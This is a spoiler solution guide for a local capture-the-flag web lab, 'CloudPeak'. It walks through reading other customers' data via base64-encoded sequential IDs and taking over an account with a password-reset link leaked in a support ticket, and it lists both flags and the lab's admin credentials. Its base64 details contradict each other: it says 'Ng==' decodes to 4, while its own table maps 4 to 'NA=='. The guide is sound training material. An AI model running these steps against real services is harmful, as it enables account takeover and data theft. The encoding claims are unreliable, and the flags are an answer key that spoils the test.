# 🕵️ CloudPeak — Solution Guide (SPOILERS)

> Full writeups for both challenges. Only read this if you're stuck, running a
> session, or finished and want to compare methodology.

**Flags:**

```
CLOUDPEAK{0bj3ct_r3f3r3nc3_1s_n0t_4uth0r1z4t10n}
CLOUDPEAK{l34k3d_r3s3t_t0k3n_3qu4ls_4cc0unt_t4k30v3r}
```

---

## Challenge 1 — Horizontal IDOR on customer resources

**Difficulty:** Intermediate (base64 hurdle first)

### Recon

1. Log in as the demo customer: `alex@cloudpeak.io` / `Cloudpeak#2026`
   (or register a fresh account).
2. Open the dashboard → click **Manage service** on your "Carter Dev — Staging"
   card.
3. The URL is `http://localhost:5000/service/Ng==` (service id 4 → base64 of
   `"4"` = `Ng==`). Hmm — wait, let's decode to be sure.

### Decoding the reference

`Ng==` is base64. Decode it:

```bash
echo "Ng==" | base64 -d
# 4
```

or in Burp Decoder, or just by eye once you notice the `=`-padding. So the
"random-looking" reference is literally **base64 of a sequential integer**. The
reference is an *object reference*, not an *authorization token*.

Your own services are ids 4 (Carter Dev Staging). Their base64 forms:

| id | base64 (ref) |
|----|--------------|
| 1  | `MQ==` |
| 2  | `Mg==` |
| 3  | `Mw==` |
| 4  | `NA==` |
| 5  | `NQ==` |
| 6  | `Ng==` |
| 7  | `Nw==` |

### Exploit

Try service **2** (`Mg==`):

```
GET /service/Mg==
```

You are now viewing **"Okafor Logistics — Fleet Portal"** — owned by
`daniel@cloudpeak.io`, not you. The page shows a flag banner, and the deployment
notes contain the flag:

```
CLOUDPEAK{0bj3ct_r3f3r3nc3_1s_n0t_4uth0r1z4t10n} — move to secrets vault before go-live. Legacy SFTP user okafor-ops still maps to /srv/okafor.
```

The response also carries the flag in `X-Cloudpeak-Flag`.

### Same bug, API surface

The dashboard page source references the JSON endpoint. `GET /api/service/2`
(while logged in) returns the same service as JSON:

```bash
curl -i http://localhost:5000/api/service/2 -b "session=<your-cookie>"
# X-Cloudpeak-Flag: CLOUDPEAK{0bj3ct_r3f3r3nc3_1s_n0t_4uth0r1z4t10n}
```

### Same bug, invoices

Invoices use plain sequential IDs: `GET /invoice/3` shows `mei@cloudpeak.io`'s
overdue bill — another read of another customer's data (billing info). No flag
here, just an extra injection point for the same class of bug.

### Why it's vulnerable

In `app.py`, `service_detail()` looks up the service and renders it with **no
`svc["owner"] == current_user()["id"]` check**. The only "security" is an
encoding that anyone can reverse. Encoding ≠ authorization.

---

## Challenge 2 — Password-reset-token IDOR → account takeover

**Difficulty:** Intermediate (chain: ticket IDOR → token reuse)

### Recon

1. Open **Support** (`/support`). It lists only *your* tickets. Notice the hint:
   *"Ticket references are assigned in order (TKT-1001, TKT-1002, …)."*
2. Try walking the sequence: `/support/ticket/TKT-1001`, `TKT-1002`, …

### Exploit — find the disclosure

Keep going until `TKT-1005`:

```
GET /support/ticket/TKT-1005
```

This is a **high-priority open ticket** owned by **Priya Sharma**
(`priya@cloudpeak.io`), subject *"Password reset link not working"*. The message
body contains:

```
Hi, I'm locked out of my account. I requested a password reset but the link from
the email keeps saying 'invalid or expired'. Here is the exact link I received so
you can check what's wrong:

https://localhost:5000/reset/3f9c1a2e-8b4d-4c5f-9e21-a7b3d5c8f2e1

It was emailed to priya@cloudpeak.io. Please advise.
```

**This is the client who disclosed her password reset.** Priya pasted her live
reset link into a support ticket — and support never revoked it. Because ticket
viewing has no ownership check, anyone can read it.

### Exploit — use the token

The token is still valid (seeded as active, ~30-day expiry). Visit:

```
GET /reset/3f9c1a2e-8b4d-4c5f-9e21-a7b3d5c8f2e1
```

- The form confirms the account is `priya@cloudpeak.io`.
- Set a new password (≥ 8 chars) and confirm.

The reset endpoint **trusts the bare token** — it resets whatever account the
token belongs to, with no check that *you* are that account. Because the token
belongs to someone other than the currently-logged-in user, this is a full
**account takeover**:

- The success page shows:

```
FLAG · account takeover
CLOUDPEAK{l34k3d_r3s3t_t0k3n_3qu4ls_4cc0unt_t4k30v3r}
```

- The response carries `X-Cloudpeak-Flag` with the same value.

### Post-exploit

1. Sign in as `priya@cloudpeak.io` with the password you just set.
2. Her dashboard shows the flag banner again (this is the "you are now Priya"
   proof):

```
FLAG · priya@cloudpeak.io account
CLOUDPEAK{l34k3d_r3s3t_t0k3n_3qu4ls_4cc0unt_t4k30v3r}
```

You also now have read access to all of Priya's services and invoices.

### Why it's vulnerable

- `ticket_detail()` renders any ticket with **no ownership check** → the reset
  link leaks.
- `reset()` resolves the token to an account and changes its password with no
  binding to the requester → anyone holding the token takes over the account.
- The reset token was **not revoked** when it was disclosed to support.

---

## What you learned (map to a real report)

| Finding | CWE | Severity |
|---------|-----|----------|
| IDOR on `/service/<ref>` and `/api/service/<id>` — read any customer's service config & credentials | CWE-639 | **High** |
| IDOR on `/support/ticket/<ref>` — read any customer's support conversations | CWE-639 | **Medium/High** |
| Password reset token leaked in ticket + `/reset/<token>` trusts bare token → account takeover | CWE-640 / CWE-639 | **Critical** |

Both challenges are the *same* root cause done two different ways:
**client-controlled object references with no server-side authorization check.**

---

## Trainer notes

- **Restoring accounts:** if a session changes a password, use `/admin`
  (`admin@cloudpeak.io` / `admin123`) and the inline **"Set password"** helper on
  the users table to reset anyone — including Priya.
- **Reset tokens:** Priya's token is valid for ~30 days from first seed. If it
  ever expires (or was consumed), regenerate via `/forgot` with
  `priya@cloudpeak.io` — the new link is printed to the **server console**
  (dev-mail log). Put that new token's URL into the ticket by editing
  `data/tickets.json` / `data/reset_tokens.json`, or just hand it to the tester.
- **Resetting the whole lab:** delete the `data/` folder and restart — fresh seed.
- **Port conflicts:** if 5000 is busy, edit `app.run(...)` at the bottom of
  `app.py`.
